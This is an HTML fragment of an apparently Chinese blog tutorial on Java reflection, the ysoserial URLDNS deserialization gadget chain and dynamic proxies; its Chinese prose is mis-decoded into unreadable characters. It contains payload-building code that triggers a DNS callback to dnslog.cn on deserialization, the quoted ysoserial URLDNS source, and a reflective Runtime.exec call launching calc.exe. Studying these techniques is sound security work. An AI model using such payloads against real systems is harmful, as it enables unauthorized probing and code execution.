class="hljs-string">&quot;student&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-3-å®ä¾‹åŒ–-åˆ›å»ºå¯¹è±¡"><a href="#2-2-3-å®ä¾‹åŒ–-åˆ›å»ºå¯¹è±¡" class="headerlink" title="2.2.3 å®ä¾‹åŒ–&#x2F;åˆ›å»ºå¯¹è±¡"></a>2.2.3 å®ä¾‹åŒ–&#x2F;åˆ›å»ºå¯¹è±¡</h3><blockquote><p>å› ä¸º Class ç±»æ˜¯ <code>private</code> ç§æœ‰å±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•é€šè¿‡åˆ›å»ºå¯¹è±¡çš„æ–¹å¼æ¥è·å– class å¯¹è±¡</p></blockquote><ul><li>é€šè¿‡ Class çš„ **newInstance() **æ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//newInstance ä¸èƒ½ä¼ å‚</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (Person) c.newInstance();<br>System.out.println(p1);<br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡ Constructor çš„ newInstance() æ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// getConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;asd&quot;</span>, <span class="hljs-number">11</span>);<br>System.out.println(p2);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png"></p><h3 id="2-2-3-è·å–ç±»é‡Œé¢çš„å±æ€§-Filed"><a href="#2-2-3-è·å–ç±»é‡Œé¢çš„å±æ€§-Filed" class="headerlink" title="2.2.3 è·å–ç±»é‡Œé¢çš„å±æ€§ Filed"></a>2.2.3 è·å–ç±»é‡Œé¢çš„å±æ€§ Filed</h3><ul><li>getField(<font style="color:#080808;background-color:#ffffff;">String name</font>)ï¼šæŒ‡å®šå˜é‡åï¼Œå¯è·å¾— public ç±»å‹çš„å±æ€§</li><li>getFields()ï¼šè·å¾—ç±»çš„ public ç±»å‹çš„å±æ€§</li><li>getDeclaredField(<font style="color:#080808;background-color:#ffffff;">String name</font>)ï¼šæŒ‡å®šå˜é‡åï¼Œå¯è·å¾—æ‰€æœ‰ç±»å‹çš„å±æ€§</li><li>getDeclaredFields()ï¼šè·å¾—ç±»çš„æ‰€æœ‰ç±»å‹çš„å±æ€§</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·å–ç±»é‡Œé¢çš„å±æ€§</span><br>Field[] personfields1 = c.getFields();<br><span class="hljs-keyword">for</span> (Field field : personfields1) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br>Field[] personfields2 = c.getDeclaredFields();<br><span class="hljs-keyword">for</span> (Field field : personfields2) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">idfield</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;id&quot;</span>);<br>System.out.println(idfield);<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">allfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(allfield);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png"></p><h3 id="2-2-4-è·å–ç±»çš„æ–¹æ³•-Method"><a href="#2-2-4-è·å–ç±»çš„æ–¹æ³•-Method" class="headerlink" title="2.2.4 è·å–ç±»çš„æ–¹æ³• Method"></a>2.2.4 è·å–ç±»çš„æ–¹æ³• Method</h3><ul><li>getMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šæ–¹æ³•åå’Œå‚æ•°ç±»å‹ï¼Œå¯è·å¾— public æ–¹æ³•ï¼ˆåŒ…å«çˆ¶ç±»ç»§æ‰¿çš„ï¼‰ã€‚</li><li>getMethods()ï¼šè·å¾—ç±»åŠçˆ¶ç±»çš„æ‰€æœ‰ public æ–¹æ³•ã€‚</li><li>getDeclaredMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šæ–¹æ³•åå’Œå‚æ•°ç±»å‹ï¼Œå¯è·å¾—æœ¬ç±»å£°æ˜çš„ä»»æ„æ–¹æ³•ï¼ˆåŒ…æ‹¬ privateã€protectedã€é»˜è®¤ã€publicï¼‰ã€‚</li><li>getDeclaredMethods()ï¼šè·å¾—ç±»ä¸­å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼ˆä¸å«çˆ¶ç±»ï¼‰ã€‚</li></ul><h3 id="2-2-5-è·å–ç±»çš„æ„é€ å™¨-Constructor"><a href="#2-2-5-è·å–ç±»çš„æ„é€ å™¨-Constructor" class="headerlink" title="2.2.5 è·å–ç±»çš„æ„é€ å™¨ Constructor"></a>2.2.5 è·å–ç±»çš„æ„é€ å™¨ Constructor</h3><ul><li>getConstructor(Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šå‚æ•°ç±»å‹ï¼Œå¯è·å¾— public æ„é€ å™¨ã€‚</li><li>getConstructors()ï¼šè·å¾—ç±»çš„æ‰€æœ‰ public æ„é€ å™¨ã€‚</li><li>getDeclaredConstructor(Class&lt;?&gt;â€¦ parameterTypes)ï¼šæŒ‡å®šå‚æ•°ç±»å‹ï¼Œå¯è·å¾—ç±»çš„ä»»æ„æ„é€ å™¨ï¼ˆåŒ…æ‹¬ privateï¼‰ã€‚</li><li>getDeclaredConstructors()ï¼šè·å¾—ç±»çš„æ‰€æœ‰æ„é€ å™¨ï¼ˆä¸è®ºä¿®é¥°ç¬¦ï¼‰ã€‚</li></ul><h2 id="2-3-URLDNS-é“¾"><a href="#2-3-URLDNS-é“¾" class="headerlink" title="2.3 URLDNS é“¾"></a>2.3 URLDNS é“¾</h2><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p>URLDNS æ˜¯  ysoserial ä¸­çš„ä¸€ä¸ªåˆ©ç”¨é“¾ï¼š</p><ul><li><p>Gadget Chain:</p></li><li><pre><code class="hljs">HashMap.readObject()</code></pre></li><li><pre><code class="hljs">  HashMap.putVal()</code></pre></li><li><pre><code class="hljs">    HashMap.hash()</code></pre></li><li><pre><code class="hljs">      URL.hashCode()</code></pre></li></ul><h3 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h3><p>é¦–å…ˆæ˜¯å› ä¸º HashMapï¼ˆjava&#x2F;util&#x2F;HashMap.javaï¼‰ ä¸­é‡å†™äº† readObject() æ–¹æ³•ï¼ŒHashMap.readObject() é€šè¿‡ <font style="color:#080808;background-color:#ffffff;">K key &#x3D; (K) s.readObject(); è¿›è¡Œååºåˆ—åŒ–ï¼Œä¹‹åè°ƒç”¨  putVal() -&gt; hash()ï¼Œåœ¨ hash() ä¸­è°ƒç”¨äº† hashCode() ï¼›ã€å…³äº HashMap çš„åˆ†æï¼š</font><a href="#KmszU">HashMap æ‰¾å…¥å£ç±»åˆ†æ</a><font style="color:#080808;background-color:#ffffff;">ã€‘</font></p><p><font style="color:#080808;background-color:#ffffff;">æ¥ä¸‹æ¥æŸ¥çœ‹ URLï¼ˆjava&#x2F;net&#x2F;URL.javaï¼‰ï¼ŒURL ä¸­ç»§æ‰¿äº† </font><strong><font style="color:#080808;background-color:#ffffff;">Serializableï¼Œ</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png"></p><p>è·Ÿè¿› hashCode</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png"></p><p><code>getHostAddress(u)</code> ä¼šå°è¯•æŠŠ URL ä¸­çš„ä¸»æœºåè§£ææˆä¸€ä¸ª <code>InetAddress</code> å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯ IP åœ°å€ï¼‰ï¼Œ å¦‚æœä¸»æœºåè§£ææˆåŠŸï¼ˆ<code>addr</code> ä¸ä¸º nullï¼‰ï¼Œå°±æŠŠè§£æå‡ºæ¥çš„ IP åœ°å€çš„ <code>hashCode()</code> åŠ å…¥åˆ° <code>h</code>ï¼ˆæ•´ä¸ª URL çš„å“ˆå¸Œå€¼ï¼‰é‡Œ  ï¼› å¦‚æœ DNS æ²¡è§£ææˆåŠŸï¼ˆ<code>addr == null</code>ï¼‰ï¼Œé‚£å°±ç›´æ¥å– URL åŸå§‹çš„ <code>host</code> å­—ç¬¦ä¸²  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png"></p><p>è·Ÿè¿› getHostAddressï¼Œ<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName(host)æ–¹æ³•ä¼šå»è§£æä¸»æœºåï¼Œ</font></p><ul><li>å¦‚æœ <code>host</code> æ˜¯ IP åœ°å€ï¼Œç›´æ¥è½¬æ¢æˆ <code>InetAddress</code>ï¼Œä¸ä¼šèµ° DNS</li><li>å¦‚æœ <code>host</code> æ˜¯åŸŸåï¼Œè¿™é‡Œå°±ä¼šå‘ç³»ç»Ÿçš„ <strong>DNS è§£æå™¨</strong> å‘èµ·è¯·æ±‚ï¼Œè§£ææˆ IP</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png"></p><hr><hr><p><strong>å®Œæ•´çš„åˆ©ç”¨é“¾ï¼š</strong></p><p> HashMap.readObject()</p><p>-&gt; HashMap.putVal()</p><p>-&gt; HashMap.hash()</p><p>-&gt; URL.hashCode()</p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode()</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode.</font>getHostAddress()</p><p>-&gt; getHostAddress.<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName()  ã€è¿™é‡Œå‘å‡º DNS è¯·æ±‚ã€‘</font></p><h3 id="å¤ç°ï¼š"><a href="#å¤ç°ï¼š" class="headerlink" title="å¤ç°ï¼š"></a>å¤ç°ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9zuzrq.dnslog.cn&quot;</span>),<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ‰§è¡Œåºåˆ—åŒ–ï¼Œå‘ç°è§¦å‘äº†dns è¯·æ±‚ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png"></p><p>å›åˆ°æºç ä¸­ï¼šå½“ hashCode ä¸ä¸º -1 æ—¶ï¼Œç›´æ¥è¿”å› hashCodeï¼Œä¸å†æ‰§è¡Œä¸‹é¢ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png"></p><p>æˆ‘ä»¬çŸ¥é“ï¼Œç¬¬ä¸€æ¬¡å°† keyï¼ˆä¹Ÿå°±æ˜¯ dnslogï¼‰ä¼ å…¥ URL.hashCode æ—¶ï¼ŒhashCode &#x3D;&#x3D; -1ï¼ˆ-1 è¡¨ç¤ºæ²¡æœ‰è®¡ç®—è¿‡ï¼‰ï¼Œæ‰§è¡Œ hashCode &#x3D; handler.hashCode(this); ï¼Œè€Œæ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œ  handler.hashCode  -&gt; getHostAddress -&gt; InetAddress.getByName(host) -&gt; å‘èµ·dnsè¯·æ±‚ï¼Œæ‰€ä»¥è¯´ï¼Œåºåˆ—åŒ–æœ¬èº«æ²¡æœ‰å‘èµ· dnsè¯·æ±‚ï¼Œæ˜¯å› ä¸º HashMap åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨äº† URL.hashCode() ï¼ŒURL.hashCode() è§£æä¸»æœºåå‘èµ· DNS è¯·æ±‚ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•ä¸åœ¨ç¬¬ä¸€æ¬¡å‘èµ·è¯·æ±‚ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br><span class="hljs-comment">//è¿™é‡Œä¸ä½¿ç”¨ put</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://yjgubh.dnslog.cn&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//äººä¸ºä¿®æ”¹ URL.hashCode ç¼“å­˜å€¼ï¼Œ</span><br>hashcodefield.set(url,<span class="hljs-number">12134</span>);<br><span class="hljs-comment">//ç”±äº hashCode != -1ï¼Œå®ƒç›´æ¥è¿”å› 12134ï¼Œä¸ä¼šè§¦å‘ DNSï¼Œåªæ˜¯æŠŠ URL å½“ key å­˜è¿›å»</span><br><span class="hljs-comment">//å­˜è¿›å»ä¹‹åï¼šæ­¤æ—¶ HashMap å†…éƒ¨åªè®°å½•ï¼škey = URL(&quot;http://xx.dnslog.cn&quot;);key çš„ hash å€¼ = 12134;value = 1</span><br>hashmap.put(url,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//ååºåˆ—åŒ–ä¹‹å‰æŠŠ hashcode æ”¹å› -1,æ¢å¤ URL.hashCode çš„é»˜è®¤çŠ¶æ€,ä¸‹ä¸€æ¬¡è°ƒç”¨ url.hashCode() æ—¶ï¼Œä¼šé‡æ–°è®¡ç®—å¹¶è§¦å‘ DNS è§£æ</span><br>hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–çš„è¿‡ç¨‹å°±ä¸ä¼š DNS è§£æï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png"></p><p>åªæœ‰ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ DNS è§£æï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png"></p><h3 id="å­¦ä¹ -ysoserial-ä¸­çš„-URLDNSï¼š"><a href="#å­¦ä¹ -ysoserial-ä¸­çš„-URLDNSï¼š" class="headerlink" title="å­¦ä¹  ysoserial ä¸­çš„ URLDNSï¼š"></a>å­¦ä¹  ysoserial ä¸­çš„ URLDNSï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//é¿å…æå‰è§£æ</span><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-comment">//åˆ›å»º HashMap + URL</span><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                <span class="hljs-comment">//é‡ç½® URL çš„ç¼“å­˜ hashCode</span><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ysoserial ä¸ºäº†é¿å…ç¬¬ä¸€æ¬¡åºåˆ—åŒ–æ—¶å°±å‘èµ· DNS è¯·æ±‚ï¼Œå®ƒä½¿ç”¨äº† SilentURLStreamHandler() å†…éƒ¨ç±»è‡ªå®šä¹‰äº† handler ï¼Œè¦†ç›–åŸæ¥çš„ URL.hashCode.<font style="color:#080808;background-color:#ffffff;">handlerï¼Œå½“ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œè¿›å…¥ SilentURLStreamHandler.getHostAddress  å’Œ  SilentURLStreamHandler.openConnection  ï¼Œéƒ½è¿”å› null ï¼Œé¿å… DNS è¯·æ±‚å’Œè®¿é—®ç½‘ç»œã€‚è¿™æ ·åœ¨åˆ›å»º payload çš„é˜¶æ®µå°±ä¸ä¼šè§¦å‘ DNS ï¼Œè€Œååºåˆ—åŒ–æ—¶ï¼ŒhashCode &#x3D;&#x3D; -1ï¼Œè§¦å‘åŸæœ¬çš„ getHostAddress è§¦å‘ DNS è¯·æ±‚ã€‚</font></p><h2 id="2-4-åˆ©ç”¨-Runtime"><a href="#2-4-åˆ©ç”¨-Runtime" class="headerlink" title="2.4 åˆ©ç”¨ Runtime"></a>2.4 åˆ©ç”¨ Runtime</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo01;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-comment">// 1. è·å– Runtime ç±»</span><br>        Class&lt;?&gt; runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 2. è·å– getRuntime() æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><br>        <span class="hljs-comment">// 3. è°ƒç”¨ getRuntime() è·å– Runtime å¯¹è±¡</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 4. è·å– exec(String) æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br>        <span class="hljs-comment">// 5. è°ƒç”¨ exec() æ‰§è¡Œ calc.exe</span><br>        execMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png"></p><h1 id="3ã€JDK-åŠ¨æ€ä»£ç†"><a href="#3ã€JDK-åŠ¨æ€ä»£ç†" class="headerlink" title="3ã€JDK åŠ¨æ€ä»£ç†"></a>3ã€JDK åŠ¨æ€ä»£ç†</h1><p>å‚è€ƒæ–‡ç« ï¼š</p><blockquote><p><a href="https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#nIfNv">ä»£ç†æ¨¡å¼(ç‹‚ç¥)</a></p><p><font style="color:rgb(25, 27, 31);">è®¾è®¡æ¨¡å¼ï¼ˆå››ï¼‰â€”â€”ææ‡‚ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼</font><a href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p></blockquote><p><strong>ä»£ç†æ¨¡å¼å³ SpringAOP çš„åº•å±‚</strong></p><p><strong>ä»£ç†æ¨¡å¼åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†</strong></p><p>åŸå‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png"> </p><h2 id="3-1-é™æ€ä»£ç†"><a href="#3-1-é™æ€ä»£ç†" class="headerlink" title="3.1 é™æ€ä»£ç†"></a>3.1 <strong>é™æ€ä»£ç†</strong></h2><p>è§’è‰²åˆ†æï¼š</p><ul><li>æŠ½è±¡è§’è‰² ï¼š ä¸€èˆ¬ä¼šä½¿ç”¨æ¥å£æˆ–è€…æŠ½è±¡ç±»æ¥è§£å†³</li><li>çœŸå®è§’è‰² ï¼šè¢«ä»£ç†è§’è‰²</li><li>ä»£ç†è§’è‰² ï¼šä»£ç†çœŸå®è§’è‰²ï¼Œ</li><li>å®¢æˆ· ï¼šè®¿é—®ä»£ç†å¯¹è±¡çš„äºº</li></ul><p>ä»£ç†æ¨¡å¼çš„å¥½å¤„ï¼š</p><ul><li>å¯ä»¥ä½¿çœŸå®è§’è‰²çš„æ“ä½œæ›´åŠ çº¯ç²¹ï¼Œä¸ç”¨å…³æ³¨ä¸€äº›å…¬å…±çš„ä¸šåŠ¡</li><li>å…¬å…±ä¹Ÿäº¤ç»™ä»£ç†è§’è‰²ï¼Œå®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥</li><li>å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•çš„æ—¶å€™ï¼Œæ–¹ä¾¿é›†ä¸­ç®¡ç†</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>ä¸€ä¸ªçœŸå®è§’è‰²å°±ä¼šäº§ç”Ÿä¸€ä¸ªä»£ç†è§’è‰²ï¼Œä»£ç é‡ç¿»å€ï¼Œå¼€å‘æ•ˆç‡ä¼šå˜ä½</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//ç§Ÿæˆ¿</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title 